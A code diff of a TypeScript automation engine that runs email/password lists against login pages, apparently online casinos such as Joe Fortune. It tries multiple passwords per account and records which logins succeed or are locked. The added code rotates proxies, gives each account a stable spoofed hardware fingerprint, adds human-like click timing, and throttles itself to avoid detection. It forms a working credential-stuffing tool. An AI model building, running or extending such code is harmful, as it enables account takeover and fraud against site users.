@@ -10,11 +10,11 @@
 import { EventEmitter } from "events";
 import Browserbase from "@browserbasehq/sdk";
 import { type Page } from "playwright-core";
-import pLimit from "p-limit";
+import * as crypto from "crypto";
 import * as fs from "fs";
 import * as path from "path";
 import { applyStealth } from "./stealth";
-import { createSession, BACKEND, PROXY_INFO, type SessionHandle } from "./cloak-backend";
+import { createSession, BACKEND, PROXY_INFO, getProxyPoolSize, type SessionHandle } from "./cloak-backend";
 
 // ─── Types ────────────────────────────────────────────────────────────────────
 
@@ -66,6 +66,7 @@ export interface EngineConfig {
   concurrency: number;
   maxRetries: number;
   targets: SiteConfig[];
+  resume?: boolean;             // load progress.json on start; skip already-completed rows
 }
 
 // ─── Custom Errors ────────────────────────────────────────────────────────────
@@ -86,7 +87,40 @@ class TempDisabledError extends Error {
 
 // ─── Response Types ───────────────────────────────────────────────────────────
 
-type LoginResponse = "incorrect" | "disabled" | "tempdisabled" | "other" | "timeout";
+type LoginResponse = "success" | "incorrect" | "disabled" | "tempdisabled" | "other" | "timeout";
+
+// Proxy/network failure detection — these errors indicate the proxy/session is
+// unusable, not that the login flow itself failed. Bubble them to the outer
+// proxy-retry loop instead of marking the site N/A.
+function isProxyOrNetworkError(err: any): boolean {
+  const msg = (err?.message || String(err || "")).toLowerCase();
+  return (
+    msg.includes("net::err_aborted") ||
+    msg.includes("net::err_connection_") ||
+    msg.includes("net::err_tunnel_connection_failed") ||
+    msg.includes("net::err_proxy_connection_failed") ||
+    msg.includes("net::err_proxy_") ||
+    msg.includes("net::err_timed_out") ||
+    msg.includes("net::err_socket_") ||
+    msg.includes("net::err_empty_response") ||
+    msg.includes("net::err_name_not_resolved") ||
+    msg.includes("net::err_ssl_") ||
+    msg.includes("net::err_cert_") ||
+    msg.includes("target page, context or browser has been closed") ||
+    msg.includes("browser has been closed") ||
+    msg.includes("websocket") && msg.includes("closed")
+  );
+}
+
+// Success indicator: this CSS class appears in an alert when login succeeds.
+// Combined with URL change away from /login, it's the primary success signal.
+const SUCCESS_SELECTOR = ".ol-alert__content--status_success";
+
+// Per-row proxy retry: how many fresh proxies to try before giving up the row.
+const MAX_PROXY_RETRIES = 3;
+
+// Resume-support checkpoint file (written after every row).
+const PROGRESS_FILE = "progress.json";
 
 // ─── Default Targets ──────────────────────────────────────────────────────────
 
@@ -114,6 +148,64 @@ export const DEFAULT_TARGETS: SiteConfig[] = [
 // Concurrency policy: default 3, absolute max 5 (× 2 sites = 10 max sessions)
 const DEFAULT_CONCURRENCY = 3;
 const MAX_CONCURRENT_CREDENTIALS = 5;
+
+// Dynamic concurrency tuning
+const WARMUP_ROWS = 5;                 // process this many rows at concurrency=1 before ramping up
+const FAILURE_WINDOW = 10;             // look at last N completed rows to gauge failure rate
+const FAILURE_THROTTLE_THRESHOLD = 0.5;  // throttle back to 1 if failure rate exceeds this
+const FAILURE_RAMPUP_THRESHOLD = 0.3;    // ramp to target only if failure rate stays below this
+
+/** Derive a deterministic 5-digit fingerprint seed from an account email
+ *  so the same account always presents the same hardware fingerprint. */
+function emailToSeed(email: string): number {
+  const hash = crypto.createHash("sha256").update(email.trim().toLowerCase()).digest("hex");
+  // 5 hex chars → 0..1048575, scale into 10000..99999 range cloak expects
+  return (parseInt(hash.slice(0, 5), 16) % 89999) + 10000;
+}
+
+/** Dynamic-resize semaphore. pLimit can't change its concurrency mid-run; this can. */
+class DynamicLimit {
+  private active = 0;
+  private waiters: Array<() => void> = [];
+  private _max: number;
+
+  constructor(initial: number) {
+    this._max = Math.max(1, initial);
+  }
+
+  get max(): number { return this._max; }
+  get activeCount(): number { return this.active; }
+
+  setMax(n: number): void {
+    this._max = Math.max(1, n);
+    this.drain();
+  }
+
+  async acquire(): Promise<() => void> {
+    if (this.active < this._max) {
+      this.active++;
+      return () => this.release();
+    }
+    return new Promise<() => void>((resolve) => {
+      this.waiters.push(() => {
+        this.active++;
+        resolve(() => this.release());
+      });
+    });
+  }
+
+  private release(): void {
+    this.active--;
+    this.drain();
+  }
+
+  private drain(): void {
+    while (this.active < this._max && this.waiters.length > 0) {
+      const w = this.waiters.shift()!;
+      w();
+    }
+  }
+}
 
 // ─── Engine ───────────────────────────────────────────────────────────────────
 
@@ -189,7 +281,7 @@ export class AutomationEngine extends EventEmitter {
     this.shouldStop = false;
     const { targets } = config;
 
-    // Initialise row statuses
+    // Initialise row statuses (or restore from checkpoint if resuming)
     this.rows = credentials.map((c, i) => ({
       rowIndex: i,
       email: c.email,
@@ -200,15 +292,23 @@ export class AutomationEngine extends EventEmitter {
       ),
     }));
 
+    let resumedCount = 0;
+    if (config.resume) {
+      resumedCount = this.loadProgress(targets);
+      if (resumedCount > 0) {
+        this.log("INFO", `▶ Resume: ${resumedCount}/${credentials.length} rows restored from ${PROGRESS_FILE}`);
+      }
+    }
+
     this.emit("started", {
       total: credentials.length,
       targets: targets.map((t) => t.name),
     });
 
-    // Clamp concurrency: default 3, absolute max 5 — never exceeded
-    const concurrency = Math.min(Math.max(config.concurrency || DEFAULT_CONCURRENCY, 1), MAX_CONCURRENT_CREDENTIALS);
+    // Clamp target concurrency: default 3, absolute max 5 — never exceeded
+    const targetConcurrency = Math.min(Math.max(config.concurrency || DEFAULT_CONCURRENCY, 1), MAX_CONCURRENT_CREDENTIALS);
     this.log("INFO", `Starting automation: ${credentials.length} credentials × ${targets.length} targets`);
-    this.log("INFO", `Concurrency: ${concurrency} creds | Response-based waits`);
+    this.log("INFO", `Concurrency: dynamic (start=1, target=${targetConcurrency}, warmup=${WARMUP_ROWS} rows) | Response-based waits`);
 
     // Browserbase backend uses the cloud API; cloak backend runs locally and skips it.
     const bb: Browserbase | null = BACKEND === "browserbase"
@@ -217,14 +317,48 @@ export class AutomationEngine extends EventEmitter {
     if (BACKEND === "cloak") {
       this.log("INFO", `Backend: cloak (local CloakBrowser) | proxy: ${PROXY_INFO}`);
     }
-    const limit = pLimit(concurrency);
+
+    // Dynamic concurrency limiter — starts at 1, ramps up after WARMUP_ROWS if success rate holds
+    const limit = new DynamicLimit(1);
+    const recentOutcomes: boolean[] = [];   // true = success-ish, false = N/A/error (sliding window)
+    let completedRows = 0;
+
+    const recordRowOutcome = (rowSucceeded: boolean) => {
+      completedRows++;
+      recentOutcomes.push(rowSucceeded);
+      if (recentOutcomes.length > FAILURE_WINDOW) recentOutcomes.shift();
+      const failureRate = recentOutcomes.length > 0
+        ? recentOutcomes.filter((o) => !o).length / recentOutcomes.length
+        : 0;
+      const prevMax = limit.max;
+      let nextMax = prevMax;
+      if (completedRows < WARMUP_ROWS) {
+        nextMax = 1;
+      } else if (failureRate > FAILURE_THROTTLE_THRESHOLD) {
+        nextMax = 1;  // throttle hard
+      } else if (failureRate <= FAILURE_RAMPUP_THRESHOLD) {
+        nextMax = targetConcurrency;
+      }
+      if (nextMax !== prevMax) {
+        limit.setMax(nextMax);
+        this.log("INFO", `⚙ Concurrency adjusted ${prevMax} → ${nextMax} (failure rate ${(failureRate * 100).toFixed(0)}% over last ${recentOutcomes.length})`);
+      }
+    };
+
     let batchSlot = 0;
 
     // Kill any stale sessions from previous runs (browserbase only)
     if (bb) await this.cleanupStaleSessions(bb, config.projectId);
 
-    const tasks = credentials.map((cred, idx) =>
-      limit(async () => {
+    const tasks = credentials.map((cred, idx) => (async () => {
+      // Skip rows that were already completed in a prior run (resume path)
+      if (this.isRowAlreadyDone(idx)) {
+        return;
+      }
+
+      const release = await limit.acquire();
+      let rowSucceededForStats = true;  // tracked for dynamic concurrency adjustments
+      try {
         if (this.shouldStop) {
           this.rows[idx].status = "skipped";
           for (const t of targets) this.rows[idx].sites[t.name].outcome = "N/A";
@@ -249,7 +383,7 @@ export class AutomationEngine extends EventEmitter {
         // Stagger session creation to avoid concurrent limit bursts
         const slot = batchSlot++;
         if (slot > 0) {
-          const staggerMs = 2000 * (slot % concurrency);
+          const staggerMs = 2000 * (slot % Math.max(limit.max, 1));
           if (staggerMs > 0) {
             this.log("INFO", `  Stagger wait ${(staggerMs / 1000).toFixed(0)}s for slot ${slot}`);
             await this.sleep(staggerMs);
@@ -261,135 +395,179 @@ export class AutomationEngine extends EventEmitter {
         this.emitRowUpdate(idx);
         this.log("INFO", `── Row ${idx + 1}/${credentials.length}: ${cred.email}`);
 
-        let handle: SessionHandle | null = null;
-        let credentialDisabled = false;  // tracks cross-site disabled state
+        // Per-account deterministic fingerprint seed (cloak only) — same hardware every time
+        const seed = BACKEND === "cloak" ? emailToSeed(cred.email) : undefined;
+        const triedProxies: string[] = [];
+        let credentialDisabled = false;
+        let lastError: any = null;
 
-        try {
-          // Backend-agnostic session creation (browserbase cloud OR local cloakbrowser)
-          handle = await createSession({
-            bb: bb || undefined,
-            projectId: config.projectId,
-            viewport: { width: 1920, height: 1080 },
-            slowMo: 250,
-          });
+        // ── Per-row proxy retry loop ──
+        // Retries on session creation failure (proxy CONNECT fail, TLS RST, etc).
+        // Real login outcomes (incorrect/disabled/etc) do NOT trigger a retry.
+        for (let proxyAttempt = 1; proxyAttempt <= MAX_PROXY_RETRIES; proxyAttempt++) {
+          let handle: SessionHandle | null = null;
 
-          this.rows[idx].sessionId = handle.sessionId;
-          this.rows[idx].recordingUrl = handle.recordingUrl;
-          const seedTag = handle.fingerprintSeed != null ? ` seed=${handle.fingerprintSeed}` : "";
-          this.log("INFO", `  Session: ${handle.sessionId}${seedTag}`);
-
-          const page: Page = handle.page;
-          page.setDefaultTimeout(30000);
-
-          // CloakBrowser ships native C++ patches — layering JS-Proxy stealth on top
-          // raises the tampering signal. Only apply for browserbase backend.
-          if (BACKEND !== "cloak") {
-            const stealthProfile = await applyStealth(page);
-            this.log("INFO", `  Stealth: Chrome ${stealthProfile.major} / ${stealthProfile.cores}c / ${stealthProfile.memory}GB`);
-          } else {
-            this.log("INFO", `  Stealth: cloakbrowser native (C++ patches)`);
-          }
-
-          // Disable CSS Animations for speed
-          await page.addStyleTag({ content: '* { transition: none !important; animation: none !important; scroll-behavior: auto !important; }' });
-
-          // Process each target site SEQUENTIALLY
-          for (const target of targets) {
-            if (this.shouldStop || credentialDisabled) break;
-
-            this.rows[idx].sites[target.name].outcome = "testing";
-            this.emitRowUpdate(idx);
-            this.log("INFO", `  ${target.name}: starting login flow...`);
-
-            try {
-              const result = await this.executeLoginFlow(page, target, cred, this.rows[idx].currentBatch);
-              this.rows[idx].sites[target.name].outcome = result.outcome;
-              this.rows[idx].sites[target.name].attempts = result.attempts;
-              this.log(
-                result.outcome === "success" ? "OK" : "WARN",
-                `  → ${target.name}: ${result.outcome} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
-              );
-
-              // Cross-site propagation: disabled/tempdisabled stops both sites
-              if (result.outcome === "permdisabled") {
-                credentialDisabled = true;
-                for (const t of targets) {
-                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
-                    this.rows[idx].sites[t.name].outcome = "permdisabled";
-                  }
-                }
-                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED — skipping all sites`);
-              } else if (result.outcome === "tempdisabled") {
-                credentialDisabled = true;
-                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
-                this.rows[idx].currentBatch++;  // advance to next batch for retest
-                for (const t of targets) {
-                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
-                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
-                  }
-                }
-                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
-              }
-            } catch (e: any) {
-              const errMsg = e.message || String(e);
-              if (e instanceof PermDisabledError) {
-                this.rows[idx].sites[target.name].outcome = "permdisabled";
-                credentialDisabled = true;
-                for (const t of targets) {
-                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
-                    this.rows[idx].sites[t.name].outcome = "permdisabled";
-                  }
-                }
-                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED`);
-              } else if (e instanceof TempDisabledError) {
-                this.rows[idx].sites[target.name].outcome = "tempdisabled";
-                credentialDisabled = true;
-                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
-                this.rows[idx].currentBatch++;  // advance to next batch for retest
-                for (const t of targets) {
-                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
-                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
-                  }
-                }
-                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
-              } else {
-                this.rows[idx].sites[target.name].outcome = "N/A";
-                this.rows[idx].sites[target.name].error = errMsg;
-                this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
+          if (proxyAttempt > 1) {
+            // Reset N/A site outcomes so the new proxy gets a clean slate
+            for (const t of targets) {
+              const s = this.rows[idx].sites[t.name];
+              if (s.outcome === "N/A" || s.outcome === "testing") {
+                s.outcome = "queued";
+                s.error = undefined;
               }
             }
-
-            this.emitRowUpdate(idx);
+            this.log("WARN", `  ↻ Proxy retry ${proxyAttempt}/${MAX_PROXY_RETRIES} (excluding ${triedProxies.length} prior)`);
           }
 
-          await handle.close().catch(() => { });
-          handle = null;
-          if (bb && this.rows[idx].sessionId) {
-            await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
-          }
-          this.log("INFO", `  Session closed: ${this.rows[idx].sessionId}`);
-        } catch (e: any) {
-          this.log("ERR", `  Session error: ${(e.message || String(e)).substring(0, 120)}`);
-          for (const target of targets) {
-            const s = this.rows[idx].sites[target.name];
-            if (s.outcome === "queued" || s.outcome === "testing") {
-              s.outcome = "N/A";
-              s.error = e.message || String(e);
+          try {
+            handle = await createSession({
+              bb: bb || undefined,
+              projectId: config.projectId,
+              viewport: { width: 1920, height: 1080 },
+              slowMo: 100,
+              fingerprintSeed: seed,
+              excludeProxies: triedProxies,
+            });
+            if (handle.proxyUsed) triedProxies.push(handle.proxyUsed);
+
+            this.rows[idx].sessionId = handle.sessionId;
+            this.rows[idx].recordingUrl = handle.recordingUrl;
+            const seedTag = handle.fingerprintSeed != null ? ` seed=${handle.fingerprintSeed}` : "";
+            this.log("INFO", `  Session: ${handle.sessionId}${seedTag}`);
+
+            const page: Page = handle.page;
+            page.setDefaultTimeout(30000);
+
+            // CloakBrowser ships native C++ patches — layering JS-Proxy stealth on top
+            // raises the tampering signal. Only apply for browserbase backend.
+            if (BACKEND !== "cloak") {
+              const stealthProfile = await applyStealth(page);
+              this.log("INFO", `  Stealth: Chrome ${stealthProfile.major} / ${stealthProfile.cores}c / ${stealthProfile.memory}GB`);
+            } else {
+              this.log("INFO", `  Stealth: cloakbrowser native (C++ patches)`);
             }
-          }
-          if (handle) await handle.close().catch(() => { });
-          if (bb && this.rows[idx].sessionId) {
-            await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
+
+            await page.addStyleTag({ content: '* { transition: none !important; animation: none !important; scroll-behavior: auto !important; }' });
+
+            // Process each target site SEQUENTIALLY (skip ones that already have a real outcome)
+            for (const target of targets) {
+              if (this.shouldStop || credentialDisabled) break;
+              const sStatus = this.rows[idx].sites[target.name];
+              if (sStatus.outcome !== "queued" && sStatus.outcome !== "testing") continue;
+
+              sStatus.outcome = "testing";
+              this.emitRowUpdate(idx);
+              this.log("INFO", `  ${target.name}: starting login flow...`);
+
+              try {
+                const result = await this.executeLoginFlow(page, target, cred, this.rows[idx].currentBatch);
+                sStatus.outcome = result.outcome;
+                sStatus.attempts = result.attempts;
+                this.log(
+                  result.outcome === "success" ? "OK" : "WARN",
+                  `  → ${target.name}: ${result.outcome} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
+                );
+
+                if (result.outcome === "permdisabled") {
+                  credentialDisabled = true;
+                  for (const t of targets) {
+                    const ss = this.rows[idx].sites[t.name];
+                    if (ss.outcome === "queued" || ss.outcome === "testing") ss.outcome = "permdisabled";
+                  }
+                  this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED — skipping all sites`);
+                } else if (result.outcome === "tempdisabled") {
+                  credentialDisabled = true;
+                  this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                  this.rows[idx].currentBatch++;
+                  for (const t of targets) {
+                    const ss = this.rows[idx].sites[t.name];
+                    if (ss.outcome === "queued" || ss.outcome === "testing") ss.outcome = "tempdisabled";
+                  }
+                  this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
+                }
+              } catch (e: any) {
+                const errMsg = e.message || String(e);
+                if (e instanceof PermDisabledError) {
+                  sStatus.outcome = "permdisabled";
+                  credentialDisabled = true;
+                  for (const t of targets) {
+                    const ss = this.rows[idx].sites[t.name];
+                    if (ss.outcome === "queued" || ss.outcome === "testing") ss.outcome = "permdisabled";
+                  }
+                  this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED`);
+                } else if (e instanceof TempDisabledError) {
+                  sStatus.outcome = "tempdisabled";
+                  credentialDisabled = true;
+                  this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
+                  this.rows[idx].currentBatch++;
+                  for (const t of targets) {
+                    const ss = this.rows[idx].sites[t.name];
+                    if (ss.outcome === "queued" || ss.outcome === "testing") ss.outcome = "tempdisabled";
+                  }
+                  this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
+                } else if (isProxyOrNetworkError(e)) {
+                  // Proxy/session failure mid-flight — bubble to outer retry loop
+                  // so a fresh sticky session is tried before giving up.
+                  this.log("WARN", `  ⚠ ${target.name}: proxy/network error — bubbling to retry: ${errMsg.substring(0, 100)}`);
+                  throw e;
+                } else {
+                  sStatus.outcome = "N/A";
+                  sStatus.error = errMsg;
+                  this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
+                }
+              }
+              this.emitRowUpdate(idx);
+            }
+
+            await handle.close().catch(() => { });
+            handle = null;
+            if (bb && this.rows[idx].sessionId) {
+              await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
+            }
+            this.log("INFO", `  Session closed: ${this.rows[idx].sessionId}`);
+            // Session ran cleanly — no need to retry the proxy
+            lastError = null;
+            break;
+          } catch (e: any) {
+            lastError = e;
+            this.log("ERR", `  Session error (proxy attempt ${proxyAttempt}): ${(e.message || String(e)).substring(0, 120)}`);
+            if (handle) await handle.close().catch(() => { });
+            if (bb && this.rows[idx].sessionId) {
+              await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
+            }
+            // Try another proxy if pool has more candidates and we have retries left
+            const poolHasMore = getProxyPoolSize() === 0 || getProxyPoolSize() > triedProxies.length;
+            if (proxyAttempt < MAX_PROXY_RETRIES && poolHasMore) {
+              await this.sleep(1000);
+              continue;
+            }
+            // Out of retries — mark unfilled sites as N/A
+            for (const target of targets) {
+              const s = this.rows[idx].sites[target.name];
+              if (s.outcome === "queued" || s.outcome === "testing") {
+                s.outcome = "N/A";
+                s.error = e.message || String(e);
+              }
+            }
           }
         }
 
         this.rows[idx].status = "done";
         this.emitRowUpdate(idx);
 
-        // Write incremental results after each row (append mode)
-        this.writeRowResultCSV(targets, this.rows[idx], idx === 0);
-      })
-    );
+        // Track success for dynamic concurrency: row counts as a failure if every
+        // site ended in N/A AND we exhausted proxy retries with an error.
+        const allNA = targets.every((t) => this.rows[idx].sites[t.name].outcome === "N/A");
+        rowSucceededForStats = !(allNA && lastError != null);
+
+        // Persist incremental results + checkpoint (resume support)
+        this.writeRowResultCSV(targets, this.rows[idx], idx === 0 && !config.resume);
+        this.saveProgress();
+      } finally {
+        release();
+        recordRowOutcome(rowSucceededForStats);
+      }
+    })());
 
     await Promise.allSettled(tasks);
 
@@ -472,8 +650,20 @@ export class AutomationEngine extends EventEmitter {
    * Wait for the site to respond after a login button press.
    * Watches for page content changes, waits for networkidle + 500ms.
    * Returns the detected response type.
+   *
+   * Success is detected via: (a) the .ol-alert__content--status_success
+   * selector appearing in the DOM, (b) the URL navigating away from the
+   * /login path (post-login redirect), or (c) the login form vanishing
+   * (submit button + password field both gone — site replaced the form
+   * with post-login content even without a URL change).
    */
-  private async waitForLoginResponse(page: Page, timeoutMs: number = 15000): Promise<LoginResponse> {
+  private async waitForLoginResponse(
+    page: Page,
+    timeoutMs: number = 15000,
+    loginUrl?: string,
+    submitSelector?: string,
+    passwordSelector?: string,
+  ): Promise<LoginResponse> {
     try {
       // Wait for DOM to load (avoids networkidle which can hang on infinite websockets)
       await page.waitForLoadState("domcontentloaded", { timeout: timeoutMs });
@@ -485,18 +675,81 @@ export class AutomationEngine extends EventEmitter {
     // Extra 500ms for late-loading DOM updates
     await this.sleep(500);
 
-    // Read page content and check for known response phrases in-browser (faster than page.content())
+    // URL-change success check (post-login redirect away from /login)
     try {
-      const response = await page.evaluate(() => {
-        const text = document.body?.innerText?.toLowerCase() || "";
-        if (text.includes("been disabled")) return "disabled";
-        if (text.includes("temporarily disabled")) return "tempdisabled";
-        if (text.includes("incorrect")) return "incorrect";
-        return "other";
-      }) as LoginResponse;
+      const currentUrl = page.url();
+      if (loginUrl && this.isUrlChangedAwayFromLogin(loginUrl, currentUrl)) {
+        this.log("INFO", `  → url-change success: ${loginUrl} → ${currentUrl}`);
+        return "success";
+      }
+    } catch { /* page closed mid-check */ }
+
+    // Read page content and check for known response phrases in-browser (faster than page.content())
+    const evalResponse = async (): Promise<LoginResponse> => {
+      return await page.evaluate(
+        ({ selector, submitSel, passwordSel }: { selector: string, submitSel: string, passwordSel: string }) => {
+          if (document.querySelector(selector)) return "success";
+          // Form-vanished success: both the submit button AND password field are gone
+          // → site replaced the login form with post-login content (Joe Fortune pattern).
+          if (submitSel && passwordSel) {
+            const submitGone = !document.querySelector(submitSel);
+            const passwordGone = !document.querySelector(passwordSel);
+            if (submitGone && passwordGone) return "success";
+          }
+          const text = document.body?.innerText?.toLowerCase() || "";
+          if (text.includes("been disabled")) return "disabled";
+          if (text.includes("temporarily disabled")) return "tempdisabled";
+          if (text.includes("incorrect")) return "incorrect";
+          return "other";
+        },
+        { selector: SUCCESS_SELECTOR, submitSel: submitSelector || "", passwordSel: passwordSelector || "" }
+      ) as LoginResponse;
+    };
+
+    try {
+      let response = await evalResponse();
+      // "other" recheck: a slow redirect may still be in flight after the initial wait.
+      // Poll once a second for up to 5s — return early on any non-"other" verdict
+      // or when the URL changes away from /login.
+      if (response === "other" && loginUrl) {
+        for (let i = 0; i < 5; i++) {
+          await this.sleep(1000);
+          if (page.isClosed()) break;
+          try {
+            if (this.isUrlChangedAwayFromLogin(loginUrl, page.url())) {
+              this.log("INFO", `  → late url-change success after ${i + 1}s: ${page.url()}`);
+              return "success";
+            }
+          } catch { /* page closed */ }
+          const recheck = await evalResponse().catch(() => null);
+          if (recheck && recheck !== "other") {
+            response = recheck;
+            break;
+          }
+        }
+      }
+      // Debug: surface the URL when we still couldn't classify — helps diagnose missed redirects
+      if (response === "other") {
+        try { this.log("INFO", `  → "other" final at URL: ${page.url()}`); } catch { /* page closed */ }
+      }
       return response;
     } catch {
       return "timeout";
+    }
+  }
+
+  /** True if the post-submit URL is no longer on the login page (counts as success). */
+  private isUrlChangedAwayFromLogin(loginUrl: string, currentUrl: string): boolean {
+    try {
+      const loginPath = new URL(loginUrl).pathname.toLowerCase();
+      const curUrl = new URL(currentUrl);
+      const curPath = curUrl.pathname.toLowerCase();
+      // Same path → no redirect; different path that doesn't contain "login" → success
+      if (curPath === loginPath) return false;
+      if (curPath.includes("login") || curPath.includes("signin") || curPath.includes("sign-in")) return false;
+      return true;
+    } catch {
+      return false;
     }
   }
 
@@ -527,12 +780,19 @@ export class AutomationEngine extends EventEmitter {
 
     // ── Shadow-DOM-aware MutationObserver: install once per page, runs on every doc ──
     if (!(page as any).__casinoObserverInstalled) {
-      await page.addInitScript(() => {
+      await page.addInitScript((successSel: string) => {
         (window as any).__casinoStatus = null;
         const install = () => {
           if (!document.body) { requestAnimationFrame(install); return; }
           const findInShadows = (root: any) => {
             if (!root || (window as any).__casinoStatus) return;
+            // CSS selector check — the success alert has a distinctive class
+            try {
+              if (root.querySelector && root.querySelector(successSel)) {
+                (window as any).__casinoStatus = "success";
+                return;
+              }
+            } catch { /* selector failed on this root */ }
             const text = (root.textContent || "").toLowerCase();
             if (text.includes("temporarily disabled")) (window as any).__casinoStatus = "tempdisabled";
             else if (text.includes("been disabled")) (window as any).__casinoStatus = "disabled";
@@ -552,7 +812,7 @@ export class AutomationEngine extends EventEmitter {
           findInShadows(document.body);
         };
         install();
-      });
+      }, SUCCESS_SELECTOR);
       (page as any).__casinoObserverInstalled = true;
     }
 
@@ -612,33 +872,80 @@ export class AutomationEngine extends EventEmitter {
     this.log("INFO", `  ${site.name}: batch ${batchIndex} · ${hasAltPw ? "multi-password" : "single + fallbacks"} \u2014 ${passwords.length} attempts`);
 
     // ── Password retry loop ──
+    let lastResponse: LoginResponse | null = null;
     for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
       const pw = passwords[attemptIdx];
       const attemptNum = attemptIdx + 1;
       const isRetry = attemptIdx === 3; // 4th attempt is a re-press of same password
 
-      if (!isRetry) {
-        // Fill password field with new password (fast autofill)
-        await page.fill(selectors.password, pw);
-        await this.sleep(500);
-        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
-      } else {
-        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: re-pressing login`);
+      // ── Late-success check: if previous attempt was "other" and the form has
+      // since vanished (or URL moved off /login), the prior submit actually
+      // succeeded — Joe Fortune sometimes replaces the form 10-15s post-click.
+      if (attemptIdx > 0 && lastResponse === "other") {
+        try {
+          const vanished = await page.evaluate(
+            ({ submitSel, passwordSel }: { submitSel: string, passwordSel: string }) => {
+              if (!submitSel || !passwordSel) return false;
+              return !document.querySelector(submitSel) && !document.querySelector(passwordSel);
+            },
+            { submitSel: selectors.submit, passwordSel: selectors.password }
+          );
+          const urlMoved = this.isUrlChangedAwayFromLogin(site.url, page.url());
+          if (vanished || urlMoved) {
+            this.log("INFO", `  ${site.name}: ✅ late success detected before attempt ${attemptNum} (vanished=${vanished} urlMoved=${urlMoved})`);
+            await this.captureScreenshot(page, `${site.name}:late-success`);
+            return { outcome: "success", attempts: attemptIdx };
+          }
+        } catch { /* page closed — fall through to normal handling */ }
       }
 
-      // ── Final cookie check right before first submit (catches late banners) ──
-      if (attemptIdx === 0) {
-        await this.dismissCookieNotice(page, site.name);
+      // ── Fill + submit, with vanished-form detection ──
+      // If the form disappears mid-attempt (Joe Fortune late-redirect pattern),
+      // page.fill/hover/click will throw "Element not found". When that happens
+      // and the form really is gone (or URL moved off /login), treat as success.
+      try {
+        if (!isRetry) {
+          await page.fill(selectors.password, pw);
+          await this.sleep(500);
+          this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
+        } else {
+          this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: re-pressing login`);
+        }
+
+        if (attemptIdx === 0) {
+          await this.dismissCookieNotice(page, site.name);
+        }
+
+        resetNetworkDetection();
+        await page.evaluate(() => { (window as any).__casinoStatus = null; }).catch(() => { });
+
+        await page.hover(selectors.submit);
+        await this.sleep(100 + Math.random() * 200);
+        await page.click(selectors.submit, { delay: 30 + Math.random() * 50 });
+      } catch (interactErr: any) {
+        const msg = interactErr?.message || String(interactErr);
+        const isElementErr = /element not found|timeout .* exceeded|waiting for selector|locator|target closed/i.test(msg);
+        if (isElementErr && attemptIdx > 0) {
+          // Form may have been replaced by post-login content during the gap
+          // between attempts \u2014 confirm by checking the page state.
+          try {
+            const vanished = await page.evaluate(
+              ({ submitSel, passwordSel }: { submitSel: string, passwordSel: string }) => {
+                if (!submitSel || !passwordSel) return false;
+                return !document.querySelector(submitSel) && !document.querySelector(passwordSel);
+              },
+              { submitSel: selectors.submit, passwordSel: selectors.password }
+            ).catch(() => false);
+            const urlMoved = this.isUrlChangedAwayFromLogin(site.url, page.url());
+            if (vanished || urlMoved) {
+              this.log("INFO", `  ${site.name}: \u2705 mid-attempt vanish success on attempt ${attemptNum} (vanished=${vanished} urlMoved=${urlMoved})`);
+              await this.captureScreenshot(page, `${site.name}:mid-vanish-success`);
+              return { outcome: "success", attempts: attemptIdx };
+            }
+          } catch { /* page closed */ }
+        }
+        throw interactErr;
       }
-
-      // ── Reset detection state before submit (race starts on click) ──
-      resetNetworkDetection();
-      await page.evaluate(() => { (window as any).__casinoStatus = null; }).catch(() => { });
-
-      // ── Press login button with human hover ──
-      await page.hover(selectors.submit);
-      await this.sleep(100 + Math.random() * 200);
-      await page.click(selectors.submit, { delay: 30 + Math.random() * 50 });
 
       // ── Fast-poll race: network trap + Shadow-DOM observer (500ms window) ──
       // Catches verdicts before tab redirects/closes on success or error overlays
@@ -662,13 +969,20 @@ export class AutomationEngine extends EventEmitter {
 
       // ── Fall back to slower DOM scan if fast race didn't catch anything ──
       const timeout = attemptIdx === 2 ? 5000 : 15000;
-      const response: LoginResponse = fastStatus || await this.waitForLoginResponse(page, timeout);
+      const response: LoginResponse = fastStatus || await this.waitForLoginResponse(
+        page, timeout, site.url, selectors.submit, selectors.password,
+      );
 
       // ── Screenshot after response ──
       await this.sleep(500);
